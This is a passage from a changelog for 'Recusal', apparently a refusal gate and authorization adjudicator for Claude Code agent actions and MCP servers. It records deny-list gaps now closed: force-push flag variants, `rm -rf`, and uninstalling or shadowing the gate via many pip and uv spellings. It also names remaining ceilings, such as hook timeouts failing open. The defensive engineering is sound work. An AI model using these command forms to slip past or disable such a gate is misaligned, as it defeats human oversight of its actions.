release lock. The kernel, manifest schema v8, and every CLI shape and exit code are
unchanged; a manifest pinned by 0.9.0 verifies unchanged (checked against a live MCP
Python SDK 2.2 server), so this is a MINOR release under `STABILITY.md`.

### Added
- **MCP 2026-07-28 on stdio.** The collector opens with `initialize`, as Claude Code
  does for stdio servers by default, so a server that speaks both revisions is pinned
  through the same handshake Claude loads it through and cannot show the verifier a
  different catalog than the agent; a legacy server receives exactly the exchange 0.9.0
  sent. Only a server that rejects the handshake is observed the 2026-07-28 way: an
  `UnsupportedProtocolVersionError` naming this client's version, or any other error
  followed by a `DiscoverResult` from `server/discover`, leads to the stateless exchange
  (per-request `_meta` carrying the protocol version, client info and capabilities); a
  modern server that does not list 2026-07-28 refuses and is never downgraded. Modern
  results must carry `resultType: "complete"`; an `input_required` result is not an
  observation. Server instructions come from the discovery result, the same field and
  the same pin. `fetch_server_stdio` also returns `protocol_version`. Measured on
  2026-09-22: the four official reference servers (everything, memory, filesystem,
  sequential-thinking, 2026.8.31) and the official Python SDK 2.2.0 and 1.30.0 servers
  produce manifests byte-identical to 0.9.0's, and the modern path observes a real SDK
  2.2.0 server that rejects `initialize` either way.
- `servers_from_claude_config(..., notes=[...])`: a `"type": "sdk"` entry is skipped,
  as Claude Code skips it (only an SDK host application registers in-process servers),
  and the skip is reported in `pin`/`verify` output, never silent. A config with nothing
  Claude Code would load refuses.

### Fixed
- **Security (deny-list):** a force-push was refused only when the flag came right after
  `push`. `git push origin main --force`, `git push origin -f`, combined short flags
  (`-uf`), and git global options before the verb (`git -C . push -f`) all passed. A
  force flag anywhere in one `git push` command segment is now refused; `-f` on a
  neighbouring command (`&& rm -f`, `| grep -f`) and branch names containing "force"
  still defer. Pinned by a table of both.
- `recusal mcp pin` printed its pin-time WARNINGs (`mcp_header_literal`,
  `mcp_env_literal`, `mcp_template_default`, `mcp_arg_secret`) only under `--json`, so
  a literal bearer token could be written into a manifest with no visible sign. Text
  output now prints each as a `warning:` line; the JSON shape and exit code are
  unchanged.
- `recusal demo --list` ran the longest scenario name into its description
  (`expired-authorizationa valid call ...`); the column now fits the longest name.
- The deny-list treats Claude Code's subagent tool, `Agent` (formerly `Task`), as
  read-only: a subagent prompt that mentions a protected path was refused as a write.
  Each of the subagent's own tool calls still reaches the hook.
- Cookbook recipe 14 used the 1.x SDK's `streamablehttp_client`, which the current MCP
  Python SDK (2.x) no longer has, and dumped only the first `tools/list` page. It now
  uses `mcp.Client` with a cursor loop, run against 2.2 and 1.30 servers.
- `.claude-plugin/marketplace.json` carries `description` and `version` at the top
  level, the current documented form (under `metadata` is accepted only for backward
  compatibility).

### Security
- `release-requirements.txt`: `cryptography` 49.0.0 to 50.0.1 (GHSA-g6cj-pr64-35w5 /
  PYSEC-2026-3552). The build and upload path does not decrypt PKCS#7; the pin moved
  because a known-vulnerable version does not stay in a reviewed lock. Every other pin
  checked clean against OSV on 2026-09-22.
- `SECURITY.md` points reporters at GitHub private vulnerability reporting, now enabled
  on the repository, and states the supported versions.

### Documentation
- A line-by-line audit of every Markdown file against the code, with each claim run or
  traced, corrected: the `protected_paths` example, which REPLACED the defaults and so
  dropped the gate's own self-protection (it now extends `DEFAULT_PROTECTED_PATHS`);
  two "verbatim" hook outputs in `PROVEN.md` that no longer matched; the loose-dict
  `status` vocabulary and the non-strict default in `EVIDENCE.md`; a pinned server that
  disappears (refused as `mcp_server_unobserved` unless acknowledged with `--removed`,
  not "a warning"); the demo's four scenarios; the Agent SDK claims, which describe a
  Messages API loop; the example gate's write confinement; which manifest versions are
  refused; the CI matrix; the July schema count; and the finished MCP screening
  extraction.
- Hook timeout is fail-open, as Claude Code now documents ("A timed-out `command`,
  `http`, or `mcp_tool` hook doesn't block the tool call"). The README, `HOWTO.md`,
  `SECURITY.md` and the 1.0 preconditions no longer list it as an open question.
- `allowedMcpServers` bounds user-added servers and is authoritative only with
  `allowManagedMcpServersOnly: true`; since Claude Code 2.1.259 it does not filter
  `managed-mcp.json` servers. Plugin users under `allowManagedHooksOnly` need the gate
  force-enabled through managed `enabledPlugins`.
- Managed Agents: the `user.tool_confirmation` shape is Anthropic's documented one (no
  longer "illustrative"), `tool_use_id` is the tool-use EVENT id, and under the `auto`
  policy Recusal decides only the calls the server pauses on.
- "Claude Agent SDK, manual loop" is renamed "Claude Messages API, manual loop", which
  is what the example is. The auto-mode statements in `LANDSCAPE.md` and `FAQ.md` are
  dated and note that auto mode is now the starting mode on Pro, Max, and Team.

### Build
- PEP 639 license metadata (`license = "Apache-2.0"`, `license-files`); the deprecated
  license classifier is removed. CI adds Python 3.14 and a weekly scheduled run. The
  pre-commit ruff and mypy revisions match the dev pins. Each SHA-pinned action's
  comment now names the exact tag that SHA resolves to (`v5.0.1`, `v1.14.0`), which
  zizmor's online audit checks; the SHAs themselves are unchanged.

## [0.9.0] - 2026-08-27

Authorization release. Recusal is a deterministic authorization adjudicator for agent
actions: it verifies each proposed action against explicit, provenance-bearing authority
evidence and can refuse before execution. A deny-list asks whether a command looks
dangerous; this release asks where the authority for this exact call came from, what it
permits, and whether the call is still inside it. The kernel is byte-identical to 0.8.0
(pinned by test), the manifest schema is still v8, and nothing existing behaves
differently, so this is a MINOR release under `STABILITY.md`.

### Added
- **`recusal.authorization`, one sibling module.** Immutable `ActionRequest` (principal
  label, tool, operation, resource, arguments with a canonical fingerprint, nonce),
  `AuthorizationContext` (every item a `Supplied(value, provenance)`: trust rule, active
  subject, allowed operations, `Constraints`, `now`, `calls_so_far`, `used_nonces`,
  approval, policy version, manifest fingerprint), and `Constraints` (fields, call
  budget, expiry, one value bound). Nine pure checks, one named finding each in a fixed
  order: `authorization.principal`, `.subject`, `.tool_operation`, `.arguments`,
  `.expiry`, `.budget`, `.replay`, `.policy_binding`, `.manifest_binding`. Absent
  evidence on any dimension refuses; it never passes by omission.
- **The composition invariant.** `certify_dimensions` requires one named finding per
  required dimension and synthesizes a failed CRITICAL
  `authorization.dimension_missing` for each absent one before folding through
  `certify_evidence`, so an unrelated passing finding cannot certify a request that
  lacks principal or subject evidence (a test demonstrates the hazard and the fix).
  `certify_authorization` runs the checks and applies the invariant. Every built-in
  dimension is always required and cannot be disabled; `additional_required=` names
  custom dimensions the adopter evidences with `authorization.<name>` findings, and a
  custom finding that reuses a built-in name is refused rather than merged.
- **Malformed evidence is rejected, never normalized.** Requests and supplied evidence
  are held to a strict JSON domain at construction: object keys must be strings, leaves
  are strings, booleans, finite numbers or null, containers are objects and arrays. Sets,
  arbitrary objects, non-string keys (`{1: "a", "1": "b"}` no longer collapses to one
  key), NaN and infinities raise `ValueError`, canonical JSON uses `allow_nan=False` and
  no `default=`, so distinct supported values are not collapsed through lossy
  normalization before hashing (collision resistance itself is SHA-256's). Numeric bounds
  compare JSON numbers only: `"nan"`, `"100"`, `True` and `float("nan")` refuse the value
  bound instead of walking through `float()`. `Constraints` validates its own shape
  (integer budget, finite bound, unique nonempty fields); `ActionRequest.resource` and
  `nonce` must be null or nonempty; `allowed_operations`, `used_nonces` and manifest
  fingerprints (64 lowercase hex) are shape-checked in their checks.
- **A runtime label is not an identity.** The principal dimension passes only through an
  adopter-supplied trust rule mapping a runtime label to a configured principal; with no
  rule it refuses. The Claude Code hook now records `agent_id`, `agent_type` and
  `permission_mode` from the `PreToolUse` event as `runtime_agent_id`,
  `runtime_agent_type`, `runtime_permission_mode` with provenance
  `claude_pretooluse_event`, in a `runtime` key outside the control identity; an event
  with none of them records no key. Measured on Claude Code 2.1.246 before it was
  written: a main session carries `permission_mode` only, a subagent carries all three.
- **`DecisionReceipt`.** Canonical JSON over the action and argument fingerprints, the
  principal label and the configured principal it resolved to, the required dimensions,
  every finding (passing ones included), the decision, the policy version and manifest
  fingerprint, evidence provenance, and the audit `seq` and head when an entry is
  supplied; `digest` is SHA-256 over that body. **Derived, not described**: everything
  adjudicated comes from the `AuthorizationDecision`, which captures the final finding
  set (synthesized `dimension_missing` findings included) and a snapshot of the evidence
  provenance, policy version and manifest fingerprint inside `certify_authorization`;
  `build` takes only the decision, an optional audit anchor and an optional timestamp,
  so a receipt cannot be labeled with a policy or provenance the decision was not made
  under. Strict in both directions: the body is frozen recursively and validated on
  construction (every field present, no unknown field, `receipt_version` 1, 64-hex
  fingerprints and heads, a non-boolean nonnegative `audit_seq`, finding contexts
  validated recursively) and **reconciled with itself**: the findings are re-folded
  through the kernel and must produce the recorded `decision` and `authorized`, every
  built-in dimension must appear exactly once, and every custom required dimension must
  be evidenced or explicitly declared missing. `from_json` refuses anything else,
  `digest_matches()` returns False for malformed state rather than raising, and
  `verify()` reports schema, consistency and digest problems together in the audit
  verifier's shape. No timestamp unless supplied. Digest-bound, not signed.
- **Strict canonicalization at every public entry point.** `canonical_json` and
  `fingerprint` validate their input against the JSON domain before encoding (a
  non-string key now raises instead of being stringified by `json.dumps`), and a
  hand-built `FrozenMapping` is validated on construction. Canonicalization performs
  no lossy normalization; digest collision resistance is inherited from SHA-256.
- **`recusal demo --scenario expired-authorization`**: the right tool with valid
  arguments refused at 21:00 because the grant expired at 20:00, refused again at 19:00
  because its label is bound to no principal, then allowed at 19:00 with a receipt.
  Nothing about the call changed; the authority did.
- 44 tests, including the kernel-freeze pin (`recusal/evidence.py` SHA-256 at the v0.8.0
  tag), the budget race demonstrated as a passing pair, and a source lock that the
  module reads no clock and imports no signing primitive.

- **Receipt metadata reconciles with the findings.** Every built-in finding records,
  under `evidence`, the provenance of the context fields its dimension decides on
  (`EVIDENCE_FIELDS`), and the policy and manifest findings always carry the current
  values they compared against; `verify()` requires the receipt's `principal`,
  `policy_version`, `manifest_fingerprint` and `evidence_provenance` to equal what its
  own findings recorded, so relabeling any of them and recomputing the digest is
  refused. Membership tests over parsed values are type-guarded, and malformed
  findings passed to `certify_dimensions` or `certify_authorization` raise the
  documented `ValueError`, never an incidental `TypeError`.

### Fixed
- **Windows audit lock no longer fails at a ten-second cliff.** `msvcrt.locking(LK_LOCK)`
  retries ten times one second apart and then raises `PermissionError`; four concurrent
  hook processes exhausted that once on a loaded CI runner (run 33018557987,
  windows-latest, 2026-08-26). The lock now polls `LK_NBLCK` with a 5 ms sleep until a
  60 s deadline and still fails closed (a raised `OSError`, so the hook denies) when the
  deadline passes. Internal only; no public surface or record shape changed.

### Not in this release, stated so it is not inferred
An identity provider, OAuth, delegation issuance or chain validation, signed receipts,
atomic quota enforcement, `updatedInput` or `escalate` hook decisions, and any
non-Claude adapter. Each waits for a requirement that comes from a real deployment.

### Changed
- The version lock moves to 0.9.0 across the package, plugin, marketplace, vendored
  runtime, and action example.
- **Release lock: `build` relocked from 1.5.1 to 1.5.0.** PyPI yanked `build` 1.5.1 after
  0.8.0 shipped ("Considers breaking changes, will discuss re-releasing as a new major
  version"). An exact `==` pin still installs a yanked file, so the release pipeline kept
  passing with only a warning; the pin is corrected deliberately and re-verified (hash
  install, `--no-isolation` build, `twine check`).
- **`docs/LANDSCAPE.md` re-read 2026-08-26.** The page said Microsoft's Agent Governance
  Toolkit does not package a refusing adjudicator; its own documentation says actions are
  intercepted and validated before execution with deterministic enforcement, so that
  sentence is withdrawn in place. Agent Passport System and Dogwood added from their
  READMEs; the OpenAI Agents SDK row now states its guardrail and approval boundaries
  from its guardrails page. Deterministic pre-execution refusal is stated as shared
  ground, not a differentiator.

### Fixed
- **`SECURITY.md` now names the two open validations** (the hook-timeout authorization
  outcome and the enterprise managed-settings patterns) that `STABILITY.md`'s 1.0
  preconditions said it named.

## [0.8.0] - 2026-07-27

Adoption release. The kernel, the manifest schema (still v8), the public APIs, and the
zero-dependency boundary are all unchanged; what changes is the distance between a
stranger and a working refusal. The first refusal no longer costs a clone, the
supply-chain work of 0.6.0 and 0.7.0 becomes something an adopter can actually run,
and the capabilities that reached only the changelog now reach the front page.

### Added
- **`recusal demo`, the refusal without a clone.** `pip install recusal && recusal demo`
  prints three offline refusals from the installed package: a write to the wrong
  customer refused before the tool runs, the shipped deny-list refusing `rm -rf`, a
  secret-file write, and its own uninstall while an ordinary command defers, and a
  pinned MCP catalog refusing both a post-approval description rewrite and an
  unreviewed tool. `--scenario` runs one, `--list` names them. `recusal/_demo.py` is
  CLI surface, not kernel: standard library only, no network, no subprocess, nothing
  written to disk, byte-identical output on every run, and it imports the same public
  surface an adopter imports, so it does not simulate the gate, it is the gate. Stated
  exactly: the command exits 0 when the demo ran, and that 0 is not a verdict;
  `recusal verdict` remains the adjudicating CLI with blocking exit codes.

### Documentation
- **`docs/VERIFY.md`: verify the gate you installed.** The SBOM (0.6.0), the build
  provenance (0.6.0), and the release-boundary Sigstore signatures (0.7.0) had no
  adopter-facing route: no copy-pasteable command existed in any document. The new page
  gives all three verifications with exact commands and a negative control for each, and
  states the two attestation layers precisely, because conflating them accepts a weaker
  check than the reader believes: PyPI PEP 740 provenance names `release.yml`, the
  workflow that published, while GitHub build provenance names `build-dist.yml`, the
  reusable workflow that built and attested. It also states what none of it establishes
  (not byte-reproducibility, nothing about what the source does, nothing about your
  deployment isolation) and names the SBOM's real boundary: a workflow run artifact
  subject to GitHub's retention window, not a release asset.
- **The named empty-evidence intents are on the front page.** `evaluate_policy` and
  `certify_evidence` shipped in 0.6.0, export from the package root, and until now
  appeared only in `docs/EVIDENCE.md`. An empty findings list is the question most gates
  get wrong, so the README and the FAQ now state both answers: findings as objections
  (empty passes) versus findings as proof (empty refuses).
- **The kernel property suite is named where contributors read.** The Hypothesis
  generative locks shipped in 0.6.0 and appeared only in this changelog; the README's
  development section and `CONTRIBUTING.md` now name them, and a kernel-touching
  contribution is asked to extend the invariants rather than only add examples.
- **Front-page altitude, with every caveat preserved.** The bypass-mode isolation
  caveat, the hook-timeout residual, and the deny-list ceiling each stated their
  boundary in several lines exactly where a first-time reader decides whether to keep
  reading. Each now states it in a clause and links the complete text one click away,
  in `SECURITY.md` and `docs/HOWTO.md`, where that text already lived. Placement
  changed and wording did not: hook timeout is still not independently established
  here, deployment isolation is still the adopter's responsibility, and a deny-list
  still never earns "cannot be subverted."
- **The hero GIF demonstrates the new front door.** Its second panel showed
  `python examples/claude_refusal.py`, which is a clone away; it now shows
  `pip install recusal` followed by `recusal demo`. The live Claude Code panel, a real
  session under `--dangerously-skip-permissions` that cannot be re-recorded from a
  script, is preserved frame for frame. `tools/render_demo_gif.py` regenerates the
  asset by executing the command the panel shows and rendering its captured stdout,
  so the README's "verbatim transcripts, rendered" is now reproducible rather than
  asserted. Pillow is required to run it and is deliberately not in the dev extra: it
  regenerates an asset, it is not part of the gate.
- PyPI version badge.

### CI
- **The verification procedure is executed, not asserted.**
  `.github/workflows/verify-release.yml` runs every command in `docs/VERIFY.md` against
  a published version, both negative controls included, and deliberately does not check
  out the repository: verification must work from the published artifacts alone, exactly
  as it does for someone who has never cloned this. The Sigstore client is pinned
  exactly, for the reason ruff is. Drift locks pin the documentation against the
  pipeline it describes: the documented signer workflow must exist and must actually
  attest, and the documented certificate identity must name the workflow holding the
  signing step.

## [0.7.1] - 2026-07-27

Release-integrity documentation and metadata patch. Runtime behavior, public APIs,
manifest version 8, and the zero-dependency boundary are unchanged.

### Fixed
- **Citation metadata follows the release.** `CITATION.cff` now names 0.7.1 and its
  release date, and the version drift lock covers it alongside the package, plugin,
  marketplace, vendored runtime, launcher binding, and onboarding pins.
- **The documented signing boundary matches the published assets.** Sigstore release
  mode signs the built sdist and wheel plus GitHub's generated tag `.tar.gz` and `.zip`
  source archives. Only the built distributions receive build-provenance attestations
  and publish to PyPI; the runtime still verifies no signatures.

### CI
- **One canonical release build.** Publishing a GitHub Release is now the sole automatic
  release trigger, preventing the tag-push and release-publication events from building
  and attesting identical artifacts twice. `workflow_dispatch` retains a non-publishing
  test/build/provenance rehearsal.
- **The Python 3.9 type-checker ceiling is executable.** CI and the release gate assert
  that the installed mypy major version remains below 2, matching the dev constraint;
  mypy 2 no longer validates the declared Python 3.9 floor.

## [0.7.0] - 2026-07-23

Declared-scope and verifiable-pipeline release, one day after 0.6.0. Manifests (now
v8) carry an explicit operator-declared observation scope; the CI pipeline is itself
audited as a blocking check; the release build runs in a reusable workflow whose
identity the provenance records (the documented SLSA Build L3 pattern); and the
built distributions are Sigstore-signed, with publish failing closed behind signing.
Manifest v7 files are refused with a migration message: re-pin, optionally with
`--scope` (and `--resolve-executable`). Runtime dependencies stay zero; every
previously released runtime surface is unchanged.

### Added
- **observation_scope (manifest v8).** Every manifest now records an explicit top-level
  `observation_scope` member: `null` (no scope declared, the explicit weak claim) or a
  nonempty operator-supplied label naming what the pin observed (a project config, a
  machine, an environment), stored verbatim via `pin --scope LABEL`. The label is
  operator metadata with a deliberately narrow contract: `verify` prints it for review
  context, `diff_observation_scope` joins the facade, and a re-pin under `--update`
  whose scope differs emits the named `mcp_observation_scope_changed` WARNING - a
  review signal, never a refusal, because the replacement is already deliberate.
  Recusal verifies the label's stability across re-pins, never its truth. A blank
  label refuses (it reads as a declared claim while claiming nothing).
  `manifest_version` 7 is refused with a migration message (re-pin; add `--scope`
  to declare a scope).

### CI
- **Workflow audit (zizmor), blocking.** The CI pipeline is itself an attack surface:
  zizmor now audits every workflow file as a blocking, version-pinned CI job, and its
  findings are fixed, not suppressed - every `actions/checkout` runs with
  `persist-credentials: false` (no job here pushes; the default leaves a live token in
  `.git` for any later step to read). Both locked by test, including a
  negative-case-verified guard that a later step's settings cannot satisfy an earlier
  checkout's requirement.
- **Release build in a reusable workflow (the documented SLSA Build L3 pattern).**
  The build, its hash-locked toolchain install, the wheel identity checks, the SBOM,
  and the provenance attestation moved verbatim into the reusable `build-dist.yml`
  workflow; `release.yml` delegates to it, so the provenance records that workflow's
  identity as the signer and a verifier can require it
  (`gh attestation verify ... --signer-workflow philpaz/recusal/.github/workflows/build-dist.yml`).
  Stated narrowly: this pins WHICH workflow built and attested the artifacts, per
  GitHub's documented path to SLSA v1 Build Level 3; it does not make the build
  byte-reproducible, and a same-repo reusable workflow is as isolated as the
  repository's own change controls. Drift-locked: attestation inline in release.yml
  refuses, the delegation is pinned by test, and the wheel's import smoke now covers
  the full public MCP facade including `diff_resolved_executable` and
  `diff_observation_scope`.
- **Sigstore signatures at the release boundary.** The built sdist and wheel are now
  keylessly Sigstore-signed in CI, with the `.sigstore.json` bundles attached to the
  GitHub Release for offline verification, and the PyPI publish fails closed behind
  signing (an unsignable distribution is a human-review signal, not a shippable
  artifact). Stated exactly, by decision: signatures live at the release boundary
  only - the runtime stays stdlib-pure with zero dependencies and verifies no
  signatures; manifests and audit logs remain hash-integrity artifacts. PyPI-side
  PEP 740 attestations continue to be generated by the publish action.
- **The formatter is pinned exactly (`ruff==0.16.0`).** An unpinned formatter defines
  "format --check green" by whatever released last: ruff 0.16.0 (markdown code-fence
  formatting) failed CI against a passing local gate, live, mid-wave. The dev extra
  now pins ruff exactly and the documentation code fences are formatted with it;
  upgrades are deliberate (bump, reformat, review, commit together).
- **OpenSSF Scorecard, continuously.** A weekly + on-push Scorecard workflow publishes
  the project's supply-chain posture to the public scorecard API, and the README badge
  reads it from there: the score is measured by tooling the maintainer does not
  control, and nothing in the repository asserts a score value - the badge IS the
  claim. Minimal permission surface (id-token only; SARIF kept as a run artifact,
  not uploaded to code scanning).

## [0.6.0] - 2026-07-23

Supply-chain and integrity release: the audit chain gains a first-class external
anchor, MCP manifests (now v7) can pin the resolved executable behind each launch
command, and the Claude Code plugin vendors the exact runtime it executes, so the
installed plugin identity names the implementation that decides. Manifest v6 files
are refused with a migration message: re-pin, optionally with `--resolve-executable`.
The plugin no longer needs `pip install`.

### Added
- **Vendored plugin runtime (plugin = implementation).** The recusal-gate Claude Code
  plugin now ships the exact recusal runtime it executes (`claude-plugin/vendor/recusal`,
  byte-identical to the package source, drift-locked by test with
  `tools/vendor_plugin.py` as the one re-sync path), so installing the plugin needs no
  `pip install` and the installed plugin identity IS the implementation that decides.
  The shim enforces it at run time: an import resolving outside the plugin's vendor
  tree (an ambient site-packages or PYTHONPATH copy) is refused as substitution, a
  missing or unimportable vendor tree refuses every tool call, and the declared-version
  binding now checks the vendored runtime against the plugin version - all fail-closed
  exit paths, each pinned by an end-to-end test running the gate with no ambient
  package available. Stated narrowly: this binds identity and origin, not file bytes
  at rest; write-protect the installed plugin directory like any control-plane file.
- **Resolved-executable strict mode (manifest v7).** The launch-identity residual named
  since 0.5.0 - a swapped file behind an unchanged command template - is now closable
  at pin time: `recusal mcp pin --resolve-executable` also pins the `{path, sha256}` of
  the file each launched stdio command's argv[0] resolves to (`shutil.which`
  semantics), and verify re-resolves and refuses (`mcp_resolved_executable_changed`,
  CRITICAL) when the resolved path or file bytes differ - proven by the wrapper arc:
  one appended line to a pinned wrapper script, template byte-identical, exit 2.
  Every v7 server entry states the claim explicitly: `resolved_executable` is `null`
  (template-only identity, the prior behavior, residual as documented) or the pinned
  identity - never an omission. A strict pin that cannot be re-resolved refuses
  (`mcp_resolved_executable_unverifiable`), an observation that skips a strict pin
  refuses (`mcp_resolved_executable_unobserved`), and the kernel primitive
  `diff_resolved_executable` joins the facade. Honest boundary: the hash attests the
  FIRST process image only; interpreter script arguments and launcher-fetched
  packages stay behind the template. `manifest_version` 6 is refused with a
  migration message (re-pin; add `--resolve-executable` to opt in).
- **AuditSink protocol + verify-on-open anchoring.** The audit chain is tamper-evident,
  not tamper-proof: a write-access attacker can rewrite or truncate the tail. The
  countermeasure is now first-class. `AuditLog(sinks=[...])` mirrors every committed
  entry, in chain order and inside the append lock, to any object with a `write(entry)`
  method (`recusal.AuditSink`, structural); a sink failure raises out of `append`, so
  the hook wiring fails closed to a deny while the local record remains. Entries carry
  `seq` and `hash`, so a sink can hold the external head anchor `(seq + 1, hash)`
  verbatim. `AuditLog(verify_on_open=True)` refuses (`AuditIntegrityError`) to resume a
  file that fails strict verification, and `expected_head=(count, hash)` anchors the
  open against truncation, tail-suffix rewrite, and forged appends, including a missing
  file unless the anchor itself says empty. Stated plainly: without an anchor, a
  truncated tail is still a self-consistent chain, and that boundary is regression-locked
  by test. Default construction and append behavior are unchanged.
- **Executable MCP launch-command-drift proof.** `examples/mcp_security_demo.py` uses the
  real pin/verify command path to approve a local MCP process, substitutes a marker-writing
  command, and proves verification refuses before that command executes. The same offline
  narrative also refuses instructions-only drift and an unpinned call; a black-box smoke
  test locks the published claim and output.
- **Named empty-evidence semantics: `evaluate_policy` / `certify_evidence`.**
  `compute_verdict([])` is `PASS`, one behavior serving two intents. The kernel now
  names them: `evaluate_policy` reads findings as objections (empty = "no objection",
  `PASS`; identical to `compute_verdict`), and `certify_evidence` reads findings as
  proof (empty = refuse, folding to `FAIL` through a synthesized failed-CRITICAL
  `no_evidence` finding; `strict` defaults to `True` so outcome-less evidence dicts
  are rejected, not defaulted to a pass). `compute_verdict` and every released
  surface, including `GateAdjudicator`'s existing empty-evidence refusal, are
  unchanged. Both names export from the package root.
- **Kernel property tests (Hypothesis, dev extra only).** Derandomized generative
  locks over the frozen kernel: verdict monotonicity and order-independence, the
  documented decision fold, fail-closed string coercion for `passed`/`status`,
  strict-mode refusal of outcome-less evidence, and tool-fingerprint stability
  across key insertion order. Runtime dependencies stay zero.

### CI
- **Release publish hardening.** The PyPI publish step no longer passes
  `skip-existing`: re-running a release whose version is already on PyPI hard-fails
  instead of silently no-opping, so a divergent rebuild cannot hide behind an
  idempotent-looking rerun. Drift-locked by test.
- **SBOM + build-provenance attestations.** The build job catalogs the built
  distributions as an SPDX SBOM and writes GitHub build-provenance attestations for
  `dist/*`, with job-scoped permissions; every action in the release workflow is
  pinned to a full commit SHA, now enforced by test. Stated narrowly: neither makes
  the build byte-reproducible.

## [0.5.12] - 2026-07-13

Hardens the 0.5.11 package-manager self-protection: the matcher now covers the valid,
statically visible command forms the flat regex missed, and the customization surface
gets explicit contracts. Narrow scope, no API change.

### Security
- **Package-manager matcher widened to option/value and launcher forms.** A bounded
  token walk now runs in union with the 0.5.11 regex (either matching refuses, so the
  addition can never regress existing coverage). It pairs a global option with its
  separate value token, which a flat regex cannot, and strips Windows launcher
  suffixes: `pip --python .venv uninstall recusal`, `python -m pip --python .venv
  install recusal`, `uv --project . remove recusal`, `uv --directory . remove recusal`,
  `uv --offline remove recusal`, `uv pip --python .venv uninstall recusal`, `pip.exe
  uninstall recusal`, and `python.exe -m pip uninstall recusal` are all refused; every
  one of them deferred in 0.5.11. Scope stays the documented pip + uv surface: pipx,
  `uv tool`, conda, and poetry are considered and excluded (isolated tool environments
  or foreign resolvers, not the import path the gate's venv resolves), and the named
  ceiling is unchanged (`pip install -e .`, `-r requirements.txt` remain unreadable to
  a string matcher; the pinned venv stays the real defense).
- **Protected package names are canonical distribution identities (PEP 503).**
  Configured and parsed names are compared case-insensitively with runs of `-`/`_`/`.`
  collapsed, so `protected_packages=("My.Gate",)` now refuses `pip uninstall my_gate`,
  `my-gate`, and `MY.GATE` alike. In 0.5.11 a mixed-case configured name silently
  matched nothing (the pattern kept its case while commands are matched lowercased),
  so the advertised customization point failed open for any non-lowercase input.
- **Empty protected names are a construction-time `ValueError`.**
  `protected_packages=("",)` (or a separator-only name) previously compiled to a
  pattern matching every package mutation, a silent deny-all; it now raises at
  `deny_list_policy()` construction and in `analyze_command`.
- **Substring matching is now an explicit contract.** A mutating package command whose
  argument merely contains a protected name (`notrecusal`, `recusal-helper`,
  `./fake-recusal`, `recusal-replacement.tar.gz`) is refused toward safety, by design:
  a name-containing source is a plausible shadow of the gate, and the cost of the
  safe-side false positive is a deferral to a human. Previously this was an accidental
  regex property, now documented and pinned both directions (ordinary package
  commands, `pip install requests`, `uv add httpx`, `pip show recusal`, still defer).
- 32 new deterministic tests pin the widened forms, the canonicalization, the
  validation, the substring contract, and the negative space (1046 total; the 66
  package-protection tests shipped in 0.5.11 all pass unchanged against the widened
  matcher).

### Documentation
- **Audit claim tightened one degree.** The README's "this is the artifact your
  auditor reads" sentence now states the disciplined version: the log can provide one
  auditable decision artifact within the broader system of records, controls, evidence
  retention, and deployment governance.

## [0.5.11] - 2026-07-12

Closes the package-manager self-protection gap and consolidates the front door: the
README now leads with the capability, and the full MCP governance statement moves to
`docs/MCP.md` unchanged.

### Security
- **`pip uninstall recusal` is now refused (deny-list).** The self-protect verb pattern
  matched `\binstall\b`, which never matches "uninstall" (there is no word boundary
  inside a word), and a bare package name carries no `recusal/` path segment, so
  uninstalling the enforcement package deferred straight through the gate. A new
  `package_self_protection` check refuses package-manager mutation of the enforcement
  package: uninstall, reinstall/downgrade, and install-time shadowing
  (`pip install -e ./fake-recusal`), across the `pip` / `pip3` / `python -m pip` /
  `py -m pip` / `uv pip` / `uv add` / `uv remove` spellings, obfuscated forms included,
  through Bash and through command-like keys on any other tool. Parameterized as
  `protected_packages` (default `("recusal",)`), and `uninstall` joins the
  self-protect verb list. 66 new tests pin the positive, obfuscated, and negative
  cases (no new false positives on ordinary package commands: `pip install requests`,
  `pip show recusal`, `pip install -e .` all still defer). The named ceiling is
  unchanged and documented: an install that provides the package without naming it
  (`pip install -e .`, `-r requirements.txt`) is unreadable to a string matcher; the
  pinned, write-protected venv stays the real defense.

### Documentation
- **README front door reordered, capability first.** The page now opens with the
  problem, what Recusal does (the deny that holds in bypass mode with the isolation
  caveat in the same breath, MCP capability integrity, the audit record shaped for
  EU AI Act Article 12 record-keeping), then the 20-second demo and install; allowlist
  mode is presented above the deny-list as the enforcement posture; the independence
  thesis moves to a "Why an independent gate" section; the launcher/exit-code/Windows
  detail folds into a collapsible block. Claim language is unchanged.
- **MCP governance statement extracted to `docs/MCP.md`.** The README keeps a summary
  (same gate, pin/verify, no-pin-no-MCP, the point-in-time boundary in one line) and
  links to the full statement with every named residual; the text moved with link
  paths adjusted and content otherwise unchanged. Docs index updated.

## [0.5.10] - 2026-07-12

Aligns the published package with current main's stronger loader invariant: the
normal `recusal mcp pin` path in 0.5.9 already rejected callable collisions, so this
closes the remaining gap for hand-edited and externally generated manifests.

### Fixed
- **Callable-collision refusal is a loader invariant (review 13, P1).** The builder
  refused two raw plugin tools normalizing to one callable, but `_validate_manifest`
  checked each pin independently - so an externally generated or hand-edited manifest
  whose pins were EACH individually canonical could carry a collision, which would
  collapse into one runtime string in `manifest_policy`. The loader now tracks
  callable identity per plugin server and refuses the collision; `manifest_policy`
  fails closed on such an artifact and `diff_observation` refuses it before comparing.
  Collision refusal is now an invariant of every accepted manifest, not only of the
  preferred builder path (three regression tests, hand-edited-artifact shaped).

### Documentation
- Stale "manifest v5" wording in the verifier docstrings and CLI comment replaced
  with schema-stable phrasing ("the current complete manifest verifier"); the README
  test references include `tests/test_mcp_runtime_identity.py`.

## [0.5.9] - 2026-07-12

The single carry-forward item from the review sequence, pulled forward from 0.6.0 and
closed: manifest v6 models raw MCP declaration identity and Claude plugin callable
identity separately. Tightly scoped; the 0.5.8 boundaries are otherwise unchanged.

### Added
- **Manifest v6: explicit runtime identity (MANIFEST_VERSION = 6).** Each server
  entry carries a canonical `runtime: {"mode": "standard_mcp" | "claude_plugin"}`,
  declared explicitly (`build_manifest(runtime_modes=...)`, CLI
  `recusal mcp pin --claude-plugin NAME`) and never inferred from a key's spelling.
  In `claude_plugin` mode each tool pin stores its `callable_name`, derived by
  Claude's documented normalization (any character outside `A-Z a-z 0-9 _ -`
  becomes `_`, exposed as `recusal.mcp.plugin_callable_name`); the raw declaration
  name remains the pin key and fingerprint subject. Discovery and drift verification
  compare RAW identity; `PreToolUse` membership checks CALLABLE identity - so a
  spec-valid dotted plugin tool (`admin.tools.list`) pins and authorizes under
  Claude's spelling, and the raw dotted spelling is not treated as a callable. Two
  raw names normalizing to one callable REFUSE the pin (ambiguous callable identity
  certifies nothing); a `claude_plugin` server key must already be the callable-safe
  runtime segment (refused, never silently rewritten); the loader re-derives every
  stored `callable_name` and refuses mismatches, requires the canonical runtime
